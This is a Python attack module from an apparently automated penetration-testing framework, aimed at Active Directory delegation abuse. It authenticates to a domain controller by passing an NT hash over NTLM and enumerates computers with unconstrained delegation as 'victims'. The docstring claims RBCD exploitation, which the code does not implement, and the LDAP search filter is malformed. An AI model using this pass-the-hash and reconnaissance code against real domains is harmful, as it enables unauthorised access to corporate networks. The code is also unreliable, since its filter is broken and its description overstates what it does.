"""
Delegation abuse module.

FR-ATK-05 | MITRE T1134.001 / T1558
Exploits unconstrained and resource-based constrained delegation (RBCD).
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "AD-DELEG-001"
    mitre_technique = "T1134.001"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip          = parameters.get("dc_ip", target)
        domain         = parameters.get("domain", "")
        username       = parameters.get("username", "")
        nt_hash        = parameters.get("nt_hash", "")
        deleg_type     = parameters.get("delegation_type", "unconstrained")
        # unconstrained | rbcd

        if not domain or not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "domain and username are required")

        try:
            import ldap3  # type: ignore

            server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            base_dn = ",".join(f"DC={p}" for p in domain.split("."))
            conn = ldap3.Connection(
                server,
                user=f"{domain}\\{username}",
                password=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}",
                authentication=ldap3.NTLM,
                auto_bind=True,
            )

            if deleg_type == "unconstrained":
                # Find computers with unconstrained delegation
                # UAC flag: TRUSTED_FOR_DELEGATION = 0x00080000
                conn.search(
                    search_base=base_dn,
                    search_filter="(&(objectClass=computer)"
                                  "(userAccountControl:1.2.840.113556.1.4.803:=524288))"
                                  "(!userAccountControl:1.2.840.113556.1.4.803:=8192)",
                    attributes=["sAMAccountName", "dNSHostName"],
                )
                victims = [str(e.sAMAccountName) for e in conn.entries]
                conn.unbind()
                return AttackResult(
                    success=len(victims) > 0,
                    outcome="SUCCESS" if victims else "NO_TARGETS",
                    gained_access=False,
                    access_level="none",
                    output=f"Unconstrained delegation hosts: {victims}",
                )

            return AttackResult(False, "UNSUPPORTED_TYPE", False, "none",
                                f"Delegation type '{deleg_type}' not yet implemented")

        except ImportError:
            return AttackResult(False, "LDAP3_MISSING", False, "none",
                                "ldap3 is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
